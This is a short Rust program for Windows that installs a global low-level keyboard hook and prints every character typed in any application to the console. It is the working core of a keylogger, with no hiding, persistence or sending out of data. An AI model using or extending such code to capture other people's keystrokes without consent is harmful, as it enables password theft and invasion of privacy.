use std::{ffi::c_void, io::Write};

use windows::Win32::{
    Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM},
    UI::{
        Input::KeyboardAndMouse::{GetKeyboardLayout, GetKeyboardState, ToUnicodeEx},
        WindowsAndMessaging::{
            CallNextHookEx, DispatchMessageW, GetMessageW, HC_ACTION, HHOOK, KBDLLHOOKSTRUCT, MSG,
            SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx, WH_KEYBOARD_LL,
        },
    },
};

static mut HOOK: *mut c_void = std::ptr::null_mut();

unsafe extern "system" fn keyboard_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if code == HC_ACTION as i32 {
        unsafe {
            let kb_struct = &*(l_param.0 as *const KBDLLHOOKSTRUCT);

            if w_param.0 == 0x100 || w_param.0 == 0x104 {
                // WM_KEYDOWN / WM_SYSKEYDOWN
                let mut key_state = [0u8; 256];
                let _ = GetKeyboardState(&mut key_state);

                let mut buff = [0u16; 8];
                let vk_code = kb_struct.vkCode as u32;

                let layout = GetKeyboardLayout(0);
                let res = ToUnicodeEx(vk_code, 0, &key_state, &mut buff, 0, Some(layout));

                if res == 1 {
                    let ch = std::char::from_u32(buff[0] as u32).unwrap_or('?');
                    print!("{}", ch);
                    std::io::stdout().flush().unwrap();
                }
            }
        }
    }

    unsafe { CallNextHookEx(None, code, w_param, l_param) }
}

fn main() {
    unsafe {
        let h_instance = HINSTANCE(std::ptr::null_mut());
        HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(h_instance), 0)
            .unwrap()
            .0;

        let mut msg = MSG::default();
        while GetMessageW(&mut msg, None, 0, 0).as_bool() {
            let _ = TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        let _ = UnhookWindowsHookEx(HHOOK(HOOK));
    }
}
